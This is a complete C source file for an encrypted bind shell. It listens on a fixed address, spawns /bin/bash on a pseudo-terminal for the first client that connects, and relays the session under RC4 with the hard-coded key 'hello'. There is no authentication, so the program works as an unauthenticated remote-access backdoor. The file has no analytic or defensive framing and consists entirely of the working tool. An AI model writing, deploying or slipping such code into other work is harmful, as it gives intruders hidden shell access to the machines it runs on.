#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/select.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <pty.h>
#include <termios.h>
#include <openssl/rc4.h>

int Fork_Salve()
{
    int pty;
    char pty_name[64];
    pid_t pid;

    pid = forkpty(&pty, pty_name, NULL, NULL);
    if (pid == -1) {
        perror("forkpty failed.");
        exit(-1);
    } else if (pid == 0) {
        execl("/bin/bash", "", NULL);
    }
    return pty;
}

void Recv_Data(int acceptfd, int pty, fd_set tempfds, RC4_KEY *key,
               unsigned char *data, int length)
{
    if (FD_ISSET(acceptfd, &tempfds)) {
        char buf[1024];
        memset(buf, 0, sizeof(buf));
        int ret = read(acceptfd, buf, sizeof(buf));
        if (ret <= 0) {
            if ((errno == EINTR || errno == EWOULDBLOCK || errno == EAGAIN)) {
                printf("errno : %s\n", strerror(errno));
            } else {
                close(acceptfd);
                exit(0);
            }
        } else {
            unsigned char *plain;
            plain = (unsigned char *)malloc(ret + 1);
            memset(plain, 0, ret + 1);
            RC4(key, ret, (unsigned char *)buf, plain);
            //printf("%s\n",plain);
            write(pty, plain, ret);
        }
    }
}

void Send_Data(int acceptfd, int pty, fd_set tempfds, RC4_KEY *key,
               unsigned char *data, int length)
{
    if (FD_ISSET(pty, &tempfds)) {
        char buf[1024];
        memset(buf, 0, sizeof(buf));
        int ret = read(pty, buf, sizeof(buf));
        if (ret <= 0) {
            if ((errno == EINTR || errno == EWOULDBLOCK || errno == EAGAIN)) {
                printf("errno : %s\n", strerror(errno));
            }
        } else {
            unsigned char *str;
            str = (unsigned char *)malloc(ret + 1);
            memset(str, 0, ret + 1);
            RC4(key, ret, (unsigned char *)buf, str);
            write(acceptfd, str, ret);
        }
    }
}

void Socket_Select(int acceptfd)
{
    RC4_KEY key1, key2;
    unsigned char *data = (unsigned char *)("hello");
    int length = strlen((char *)data);
    RC4_set_key(&key1, length, data);
    RC4_set_key(&key2, length, data);

    int pty = Fork_Salve();
    fd_set readfds, tempfds;
    int maxfd;
    maxfd = acceptfd;
    FD_ZERO(&readfds);
    FD_SET(acceptfd, &readfds);
    FD_SET(pty, &readfds);
    if (maxfd < pty) {
        maxfd = pty;
    }

    while (1) {
        tempfds = readfds;
        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        int val = select(maxfd + 1, &tempfds, NULL, NULL, &tv);
        if (val < 0) {
            if (errno == EINTR) {
                continue;
            }
            perror("select failed");
            exit(-1);
        } else if (val == 0) {
            printf("timeout.\n");
            continue;
        }

        Recv_Data(acceptfd, pty, tempfds, &key2, data, length);
        Send_Data(acceptfd, pty, tempfds, &key1, data, length);
    }
}

int main(int argc, const char *argv[])
{
    if (argc < 2) {
        printf("input port!\n");
        exit(-1);
    }

    //socket();
    int sockfd, acceptfd;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket failed.");
        exit(-1);
    }
    printf("socket ok.\n");

    //bind();
    struct sockaddr_in serveraddr, clientaddr;
    bzero(&serveraddr, sizeof(serveraddr));
    serveraddr.sin_family = AF_INET;
    serveraddr.sin_port = htons(atoi(argv[1]));
    serveraddr.sin_addr.s_addr = inet_addr("10.0.0.70");
    socklen_t serverlen = sizeof(serveraddr);

    int opt = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (const void *)&opt,
               sizeof(opt));
    if (bind(sockfd, (struct sockaddr *)&serveraddr, serverlen) < 0) {
        perror("bind failed.");
        exit(-1);
    }
    printf("bind ok.\n");

    //listen();
    if (listen(sockfd, 5) < 0) {
        perror("listen failed.");
        exit(-1);
    }
    printf("listen ok.\n");

    //accept();
    bzero(&clientaddr, sizeof(clientaddr));
    socklen_t clientlen = sizeof(clientaddr);
    if ((acceptfd =
             accept(sockfd, (struct sockaddr *)&clientaddr, &clientlen)) < 0) {
        perror("accept error.");
        exit(-1);
    }
    printf("accept ok.\n");

    Socket_Select(acceptfd);

    close(sockfd);
}
